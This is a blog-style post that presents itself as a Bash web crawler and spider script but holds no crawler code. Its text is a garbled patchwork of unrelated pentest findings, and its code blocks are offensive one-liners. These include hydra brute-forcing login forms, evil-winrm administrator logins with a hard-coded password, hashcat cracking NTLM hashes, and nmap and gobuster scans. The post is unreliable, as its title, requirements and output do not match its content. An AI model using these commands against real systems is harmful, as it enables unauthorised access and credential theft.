---
TitleSEO: "Web Crawler and Spider in Bash | ZureFX"
TitlePost: "Web Crawler and Spider — Bash"
Author: "ZureFX"
Description: "A Bash script for web crawler and spider. Built for security research and automation."
Keywords: "parser, tool, rust, go, fuzzer, automation, bash"
URL: "https://zurefx.github.io/scripting/script-web-crawler-and-spider-290.html"
URL_IMAGES: ""
Date: "2024-11-11"
Tags: "Parser, Tool, Rust, Go, Fuzzer, Automation, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-web-crawler-and-spider-290"
Permalink: "/scripting/script-web-crawler-and-spider-290.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `hydra`
- `nikto`
- `smbexec`

## Implementation

### Core Logic

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
nmap -sCV -p8443,995,587 10.64.45.166 -oN scan.txt
evil-winrm -i 10.41.164.252 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.78.110.69/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.85.181.246 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.53.102.31 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.44.69.186 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.61.45.31 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 22.04s
```
